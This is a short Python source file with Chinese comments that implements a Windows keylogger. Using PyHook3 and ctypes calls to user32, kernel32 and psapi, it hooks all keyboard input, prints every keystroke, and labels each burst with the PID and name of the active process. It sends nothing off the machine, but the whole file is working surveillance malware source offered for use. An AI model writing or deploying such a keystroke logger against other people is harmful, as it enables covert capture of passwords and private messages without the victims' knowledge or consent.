# coding=utf-8

import PyHook3 as pyHook
from ctypes import *
import pythoncom
import win32clipboard

user32=windll.user32
kernel32=windll.kernel32
psapi=windll.psapi
current_window = None
paste_data = None

def main():
    k=pyHook.HookManager()   # 创建一个“钩子”管理对象
    k.KeyDown=KeyStroke # 监听所有键盘事件
    k.HookKeyboard() #设置键盘“钩子”
    pythoncom.PumpMessages()

#回调函数打印键盘记录
def KeyStroke(event):
    global current_window
    global paste_data
    if event.Window != current_window:
        current_window = event.Window
        get_current_process()
    if event.Ascii>32 and event.Ascii <127:
        print(chr(event.Ascii),end="")
    else:
        print("[%s]" % event.Key)
    return True

#打印当前窗口进程信息
def get_current_process():
    hwnd = user32.GetForegroundWindow()  # 返回目标桌面上当前活动窗口的句柄（指针）
    pid = c_ulong(0)  # 定义一个C语言类型的unsign long类型
    user32.GetWindowThreadProcessId(hwnd, byref(pid)) # 返回当前窗口进程ID给pid
    process_id = pid.value # pip是ctypes类型的数据，用pip.value转换为python类型
    buffer = create_string_buffer(b'\x00', 512) # 申请缓冲区
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)  # 打开id对应的进程，返回一个进程的句柄
    # 将进程的名称拷贝到缓冲区buffer
    # 1.指定进程的句柄 2.指定模块句柄 3.指定缓冲区指针，缓冲区用来接收进程的名称 4.指定缓冲区大小
    psapi.GetModuleBaseNameA(h_process, None, byref(buffer), 512)
    process_name = buffer
    print("")
    print("[--- PID: %d - %s ---]" % (process_id, process_name))
    print("")
    # 关闭句柄
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)

if __name__ == '__main__':
    main()